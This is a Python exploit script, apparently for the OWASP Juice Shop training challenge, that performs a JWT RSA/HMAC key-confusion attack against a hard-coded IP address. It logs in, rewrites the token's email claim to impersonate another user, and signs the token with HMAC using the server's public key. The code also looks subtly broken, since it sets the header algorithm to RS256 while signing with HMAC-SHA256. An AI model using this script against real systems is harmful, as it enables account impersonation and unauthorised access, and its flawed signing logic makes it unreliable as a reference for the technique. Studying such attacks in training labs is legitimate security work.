import base64
import json
import hmac
import hashlib
import requests
import urllib3
urllib3.disable_warnings()

class ForgedJWT:
    def __init__(self):
        self.base_url = "http://45.76.47.218:3000"
        self.session = requests.Session()
        self.session.verify = False
        self.rsa_pub_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvxW2wuTTK2d0ob5mu/AS
59IxG3GXwNbXpAoBetUYpHqwT8jjs7rpIZHtVl5m6qk6X4QE6pQ6ZtCQA6/oQAFu
S5ZiaeB1GjKqmGtrbVY9HB+CqFYkBGIB0vocal0b12WZ0IA7ty1uPb9ZDUlsF6pj
4ye3WrHHcmDJ6TURtE6kL7JUrHoETGQzyfHsVk9YMHBpfFYC3ohL1G39CKPHxQtP
iwXAjkiYpJgZ2kHhqeEZyEsH0Qr1zvPV6DBES3T+mEaYoQelC2VVvdxg4g1HplWu
B5nlzHh7DZOxhnY/w/G6AAJ7t6L8VV9mclKhX7wAXTQT6FYLdtvmOlTGxLt4lSJE
UwIDAQAB
-----END PUBLIC KEY-----"""

    def login(self):
        print("[*] Getting initial token...")
        response = self.session.post(
            f"{self.base_url}/rest/user/login",
            json={"email": "demo", "password": "demo"},
            headers={"Content-Type": "application/json"}
        )
        if response.status_code == 200:
            token = response.json()['authentication']['token']
            print("[+] Got initial token")
            return token
        print(f"[-] Login failed: {response.status_code}")
        return None

    def decode_jwt(self, token):
        parts = token.split('.')[:2]
        decoded = []
        for part in parts:
            padding = 4 - (len(part) % 4)
            if padding != 4:
                part += '=' * padding
            decoded.append(json.loads(base64.urlsafe_b64decode(part)))
        return decoded[0], decoded[1]

    def encode_jwt_part(self, data):
        return base64.urlsafe_b64encode(
            json.dumps(data, separators=(',',':')).encode()
        ).rstrip(b'=').decode()

    def modify_token(self, token):
        print("[*] Modifying token...")
        header, payload = self.decode_jwt(token)
        header['alg'] = 'RS256'
        payload['data']['email'] = 'rsa_lord@juice-sh.op'
        
        print(f"[+] Algorithm changed to: {header['alg']}")
        print(f"[+] Email changed to: {payload['data']['email']}")
        
        header_encoded = self.encode_jwt_part(header)
        payload_encoded = self.encode_jwt_part(payload)
        
        return f"{header_encoded}.{payload_encoded}"

    def sign_token(self, unsigned_token):
        print("[*] Signing token...")
        key = self.rsa_pub_key.encode()
        signature = hmac.new(key, unsigned_token.encode(), hashlib.sha256).digest()
        return base64.urlsafe_b64encode(signature).rstrip(b'=').decode()

    def test_token(self, token):
        print("[*] Testing forged token...")
        
        # Login avec le token forgé pour trigger le flag
        login_response = self.session.post(
            f"{self.base_url}/rest/user/login",
            json={"email": "rsa_lord@juice-sh.op", "password": "whatever"},
            headers={
                "Authorization": f"Bearer {token}",
                "Content-Type": "application/json"
            }
        )
        print(f"[*] Login response with forged token: {login_response.status_code}")
        print(f"[*] Response: {login_response.text[:200]}")
        
        return login_response.status_code == 200

    def run_attack(self):
        print("\n[*] Starting JWT RSA Key Confusion Attack...")
        
        initial_token = self.login()
        if not initial_token:
            return False
            
        unsigned_token = self.modify_token(initial_token)
        signature = self.sign_token(unsigned_token)
        forged_token = f"{unsigned_token}.{signature}"
        
        print(f"\n[*] Forged token: {forged_token}\n")
        
        if self.test_token(forged_token):
            print("\n[+] Attack successful!")
        else:
            print("\n[-] Attack failed")

if __name__ == "__main__":
    ForgedJWT().run_attack()